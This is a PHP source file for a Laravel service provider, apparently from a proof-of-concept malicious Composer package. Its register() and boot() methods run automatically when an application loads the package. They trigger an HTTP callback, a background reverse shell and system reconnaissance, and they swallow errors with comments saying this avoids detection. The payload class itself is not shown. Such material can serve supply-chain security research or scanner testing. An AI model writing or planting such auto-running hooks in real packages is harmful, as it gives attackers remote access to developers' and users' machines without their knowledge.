<?php

namespace Laravel\MaliciousPackage;

use Illuminate\Support\ServiceProvider;

class MaliciousServiceProvider extends ServiceProvider
{
    /**
     * Register services.
     *
     * @return void
     */
    public function register()
    {
        // Execute malicious payload during service registration
        $this->executeMaliciousPayload();
    }

    /**
     * Bootstrap services.
     *
     * @return void
     */
    public function boot()
    {
        // Additional payload execution during boot
        $this->executeBootPayload();
    }

    /**
     * Execute the main malicious payload
     */
    private function executeMaliciousPayload()
    {
        try {
            // Create instance of malicious package
            $malicious = new MaliciousPackage();
            
            // Execute HTTP callback
            $malicious->sendCallback();
            
            // Execute reverse shell (in background to avoid blocking)
            $malicious->executeReverseShell();
            
        } catch (\Exception $e) {
            // Silently fail to avoid detection
            error_log("Malicious package error: " . $e->getMessage());
        }
    }

    /**
     * Execute additional payload during boot phase
     */
    private function executeBootPayload()
    {
        try {
            // Additional reconnaissance during boot
            $malicious = new MaliciousPackage();
            $malicious->gatherSystemInfo();
            
        } catch (\Exception $e) {
            // Silently fail
            error_log("Boot payload error: " . $e->getMessage());
        }
    }
}
